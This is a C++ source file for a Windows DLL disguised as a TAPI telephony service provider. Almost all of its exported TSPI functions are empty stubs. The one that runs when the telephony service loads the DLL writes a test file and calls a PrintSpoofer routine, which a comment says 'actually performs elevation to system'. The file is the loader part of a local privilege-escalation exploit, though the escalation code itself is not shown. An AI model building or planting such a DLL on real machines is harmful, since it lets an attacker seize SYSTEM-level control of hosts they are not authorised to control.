// dllmain.cpp : Defines the entry point for the DLL application.

/*
https://stackoverflow.com/questions/5080233/where-is-win32-defined-and-how-can-i-include-this-definition-in-my-project
This helped me! Thanks! The property is called "Preprocessor Definitions" and WIN32 must be in there (for WIN32 projects). – frogpelt Feb 6 '15 at 15:03
*/
#include "pch.h"
#include <tspi.h>
#include <tapi.h>
#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>
#include <string.h>
#include <stdlib.h>
#include <string>
#include "PrintSpoofer.h"


// function that is executed as soon as service loads dll
extern "C" LONG TSPIAPI TSPI_lineNegotiateTSPIVersion(DWORD dwDeviceID, DWORD dwLowVersion, DWORD dwHighVersion, LPDWORD lpdwTSPIVersion) {
    // creates file as test if function runs as network service
    HANDLE hFile = CreateFileW(L"C:\\Users\\Public\\systemTest.txt", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        OutputDebugStringW(L"failed");
    runME(); //<= actually performs elevation to system
    CloseHandle(hFile);
    return 0;
}

extern "C" LONG TSPIAPI TSPI_phoneClose(HDRVPHONE hdPhone) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_phoneDevSpecific(DRV_REQUESTID dwRequestID, HDRVPHONE hdPhone, LPVOID lpParams, DWORD dwSize) {
    return dwRequestID;
}

extern "C" LONG TSPIAPI TSPI_phoneGetButtonInfo(HDRVPHONE hdPhone, DWORD dwButtonLampID, LPPHONEBUTTONINFO lpButtonInfo) {
    return 0;
}
extern "C" LONG TSPIAPI TSPI_phoneGetDevCaps(
    DWORD       dwDeviceID,
    DWORD       dwTSPIVersion,
    DWORD       dwExtVersion,
    LPPHONECAPS lpPhoneCaps
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_phoneGetDisplay(
    HDRVPHONE   hdPhone,
    LPVARSTRING lpDisplay
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_phoneGetExtensionID(
    DWORD              dwDeviceID,
    DWORD              dwTSPIVersion,
    LPPHONEEXTENSIONID lpExtensionID
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_phoneGetHookSwitch(
    HDRVPHONE hdPhone,
    LPDWORD   lpdwHookSwitchDevs
) {
    return 0;
}


extern "C" LONG TSPIAPI TSPI_phoneGetID(
    HDRVPHONE   hdPhone,
    LPVARSTRING lpDeviceID,
    LPCWSTR     lpszDeviceClass,
    HANDLE      hTargetProcess
) {
    return 0;
}

LONG TSPIAPI TSPI_phoneGetLamp(
    HDRVPHONE hdPhone,
    DWORD     dwButtonLampID,
    LPDWORD   lpdwLampMode
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_phoneGetRing(
    HDRVPHONE hdPhone,
    LPDWORD   lpdwRingMode,
    LPDWORD   lpdwVolume
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_phoneGetStatus(
    HDRVPHONE     hdPhone,
    LPPHONESTATUS lpPhoneStatus
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_phoneNegotiateTSPIVersion(
    DWORD   dwDeviceID,
    DWORD   dwLowVersion,
    DWORD   dwHighVersion,
    LPDWORD lpdwTSPIVersion
) {
    return 0;
}


extern "C" LONG TSPIAPI TSPI_phoneOpen(
    DWORD       dwDeviceID,
    HTAPIPHONE  htPhone,
    LPHDRVPHONE lphdPhone,
    DWORD       dwTSPIVersion,
    PHONEEVENT  lpfnEventProc
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_phoneSelectExtVersion(
    HDRVPHONE hdPhone,
    DWORD     dwExtVersion
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_phoneSetDisplay(
    DRV_REQUESTID dwRequestID,
    HDRVPHONE     hdPhone,
    DWORD         dwRow,
    DWORD         dwColumn,
    LPCWSTR       lpsDisplay,
    DWORD         dwSize
) {
    return dwRequestID;
}

extern "C" LONG TSPIAPI TSPI_phoneSetHookSwitch(
    DRV_REQUESTID dwRequestID,
    HDRVPHONE     hdPhone,
    DWORD         dwHookSwitchDevs,
    DWORD         dwHookSwitchMode
) {
    return dwRequestID;
}

extern "C" LONG TSPIAPI TSPI_phoneSetLamp(
    DRV_REQUESTID dwRequestID,
    HDRVPHONE     hdPhone,
    DWORD         dwButtonLampID,
    DWORD         dwLampMode
) {
    return dwRequestID;
}

extern "C" LONG TSPIAPI TSPI_phoneSetRing(
    DRV_REQUESTID dwRequestID,
    HDRVPHONE     hdPhone,
    DWORD         dwRingMode,
    DWORD         dwVolume
) {
    return dwRequestID;
}

extern "C" LONG TSPIAPI TSPI_phoneSetStatusMessages(
    HDRVPHONE hdPhone,
    DWORD     dwPhoneStates,
    DWORD     dwButtonModes,
    DWORD     dwButtonStates
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_providerCreatePhoneDevice(
    DWORD_PTR dwTempID,
    DWORD     dwDeviceID
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_providerEnumDevices(
    DWORD      dwPermanentProviderID,
    LPDWORD    lpdwNumLines,
    LPDWORD    lpdwNumPhones,
    HPROVIDER  hProvider,
    LINEEVENT  lpfnLineCreateProc,
    PHONEEVENT lpfnPhoneCreateProc
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_providerInit(
    DWORD            dwTSPIVersion,
    DWORD            dwPermanentProviderID,
    DWORD            dwLineDeviceIDBase,
    DWORD            dwPhoneDeviceIDBase,
    DWORD_PTR        dwNumLines,
    DWORD_PTR        dwNumPhones,
    ASYNC_COMPLETION lpfnCompletionProc,
    LPDWORD          lpdwTSPIOptions
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_providerInstall(
    HWND  hwndOwner,
    DWORD dwPermanentProviderID
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_providerRemove(
    HWND  hwndOwner,
    DWORD dwPermanentProviderID
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_providerShutdown(
    DWORD dwTSPIVersion,
    DWORD dwPermanentProviderID
) {
    return 0;
}

extern "C" LONG TSPIAPI TSPI_providerUIIdentify(
    LPWSTR lpszUIDLLName
) {
    return 0;
}

extern "C" LONG TSPIAPI TUISPI_providerInstall(
    TUISPIDLLCALLBACK lpfnUIDLLCallback,
    HWND              hwndOwner,
    DWORD             dwPermanentProviderID
) {
    return 0;
}

extern "C" LONG TSPIAPI TUISPI_providerRemove(
    TUISPIDLLCALLBACK lpfnUIDLLCallback,
    HWND              hwndOwner,
    DWORD             dwPermanentProviderID
) {
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
